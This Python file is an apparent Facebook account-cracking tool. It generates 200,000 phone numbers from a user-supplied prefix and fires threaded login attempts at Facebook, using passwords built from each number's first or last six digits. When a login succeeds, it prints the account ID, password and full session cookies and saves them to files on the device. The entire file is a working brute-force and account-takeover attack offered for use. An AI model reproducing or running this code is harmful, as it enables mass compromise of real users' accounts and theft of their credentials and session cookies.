import os,re,sys,uuid,random,time,json,base64,subprocess,shutil,string, requests 
from concurrent.futures import ThreadPoolExecutor as ThreadPool




loop=0
oks=[]


logo="""
    ┏┳┓┏┓┏┓┏┳┓
     ┃ ┣ ┗┓ ┃ 
     ┻ ┗┛┗┛ ┻"""
az_string = string.ascii_uppercase



def main():
    user=[]
    os.system("clear")
    print(logo)
    pwx=["first6","last6"]
    print("—"*30)
    print(" CODE: 0171 0181 082 067")
    print("—"*30)
    code=input("[!] -->")

    met=""
    
    
    for i in range(200000):
        gg=str(random.choice(range(1000000,9999999)))
        user.append(gg)
    with ThreadPool(max_workers=30) as update:
        os.system("clear")
        print(logo)
        print("—"*30)
        print("  Used Code "+code)
        print("—"*30)
        for xd in user:
            uid=code+xd
            update.submit(host,uid,pwx,met)

def fbDomin(met):
    if "1" in met:
        return "mbasic.facebook.com"
    elif "2" in met:
        return "p.facebook.com"
    elif "3" in met:
        return "m.facebook.com"
    elif "4" in met:
        return "touch.facebook.com"
    elif "5" in met:
        return "free.facebook.com"
    else:
        return "x.facebook.com"


session_token="YT"
usershow="TESTING"




def host(uid,pwx,met):
    global oks,loop
    sys.stdout.write(f"\r  \x1b[38;1;155m\x1b[38;5;155m[TESTING]   {loop}⟩\x1b[38;5;155m{str(len(oks))}\r "),
    sys.stdout.flush()
    try:
        
        for pw in pwx:
            ps=pw.replace("first6",uid[:6]).replace("First6",uid[:6]).replace("first7",uid[:7]).replace("First7",uid[:7]).replace("first8",uid[:8]).replace("First8",uid[:8]).replace("first9",uid[:9]).replace("First9",uid[:9]).replace("first10",uid[:10]).replace("First10",uid[:10]).replace("number",uid).replace("Number",uid).replace("last6",uid[-6:]).replace("Last6",uid[-6:]).replace("last7",uid[-7:]).replace("Last7",uid[-7:]).replace("last8",uid[-8:]).replace("Last8",uid[-8:]).replace("last9",uid[-9:]).replace("Last9",uid[-9:]).replace("last10",uid[-10:]).replace("Last10",uid[-10:])
            session=requests.session()
            link=session.get("https://m.facebook.com/").text
            rr=random.randint
            data = {
            "jazoest": re.search('name="jazoest" value="(.*?)"', str(link)).group(1), 
            "lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1), 
            "display": "",
            "isprivate": "",
            "return_session": "",
            "skip_api_login": "",
            "signed_next": "",
            "trynum": "1",
            "timezone": "420",
            "lgndim": "eyJ3IjoxOTIwLCJoIjoxMDgwLCJhdyI6MTkyMCwiYWgiOjEwNDAsImMiOjI0fQ%3D%3D",
            "lgnrnd": "033753_ik6I",
            "lgnjs": "1714300673",
            "email": uid,
            "prefill_contact_point": "",
            "prefill_source": "",
            "prefill_type": "",
            "first_prefill_source": "",
            "first_prefill_type": "",
            "had_cp_prefilled": "false",
            "had_password_prefilled": "false",
            "ab_test_data": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
            "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps)}
            headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://bn-in.facebook.com',
            'priority': 'u=0, i',
            'referer': 'https://bn-in.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzE0MzAwNjQwLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D',
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1'}
            session.post('https://bn-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',headers=headers, data=data).text
            heron_brand=session.cookies.get_dict().keys()
            if "c_user" in heron_brand:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xd=coki.split("c_user=")[1].split(";")[0]
                print(f"\r\r[SUCCESSFUL] {xd} | {ps} | {coki}")
                oks.append(xd)
                nonvx=session.cookies.get_dict()["xs"][-2:]
                if nonvx in ["-1"]:
                    open("/sdcard/svg_novery.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                else:
                    open("/sdcard/svg_test-ok.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                
                break
            
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass


main()


